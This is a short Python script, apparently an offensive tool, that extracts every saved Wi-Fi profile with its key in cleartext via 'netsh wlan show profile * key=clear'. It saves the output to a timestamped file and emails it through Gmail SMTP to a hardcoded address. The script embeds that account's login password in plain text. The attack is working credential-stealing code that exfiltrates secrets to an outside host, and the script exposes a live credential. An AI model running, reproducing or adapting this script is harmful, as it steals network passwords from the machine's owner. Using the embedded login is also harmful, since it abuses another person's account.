#!/usr/bin/env python3

_auth_ = 'RWG'

import subprocess
import smtplib
import platform
import time

def SendMail(addr,password,message):
    #
    s = smtplib.SMTP("smtp.gmail.com",587)
    #
    s.starttls()
    #
    s.login(addr,password)
    #
    s.sendmail(addr,addr,message)
    #
    s.quit()

def TimeStamp():
    #
    t = time.ctime()
    #
    noColons = t.replace(':','_') ; refinedTime = noColons.replace(' ',"_")
    #
    return refinedTime 

def main():
    #
    print("[*] WLAN Profile Data Extraction Script [*]")
    #
    time.sleep(1)
    #
    host = platform.uname() ; print("[*] Hostname: ", host[1]) ; hostName = str(host[1])
    #
    t = TimeStamp()
    #
    fileName = 'wlanProfile'+'_'+hostName+'_'+t+'.txt'
    #
    wlanOutput = open(fileName,'w')
    #
    wlanOutput.write("[*] WLAN Profile data for: %s \n" % hostName)
    #
    wlanOutput.write('-------------------------\n')
    #
    wlanOutput.write(t+'\n')
    #
    wlanData = subprocess.check_output(['netsh','wlan','show','profile','*','key=clear'],universal_newlines=True)
    #
    wlanData = str(wlanData) ; SendMail('018213110x@gmail.com','$CnPG_hay3',wlanData)
    #
    wlanOutput.write(wlanData)
    #
    wlanOutput.close()
    #
    print(wlanData)
    #
    time.sleep(1)

if(__name__ == '__main__'):
    #
    main()